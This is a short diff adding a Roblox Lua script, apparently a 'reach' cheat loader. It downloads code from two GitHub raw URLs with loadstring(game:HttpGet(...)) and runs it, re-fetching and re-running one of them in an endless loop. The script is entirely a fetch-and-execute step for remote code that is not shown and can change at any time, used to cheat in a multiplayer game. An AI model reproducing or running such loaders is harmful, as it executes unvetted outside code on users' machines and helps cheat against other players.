@@ -1,0 +1,6 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/veryskilledperson/veryskilledperson/main/2reach'),true))()--reach 2
+_G.Condition = true
+while _G.Condition do -- Checks if the condition is true
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/veryskilledperson/mainreach/main/Reach'),true))()--reach main
+wait()
+end
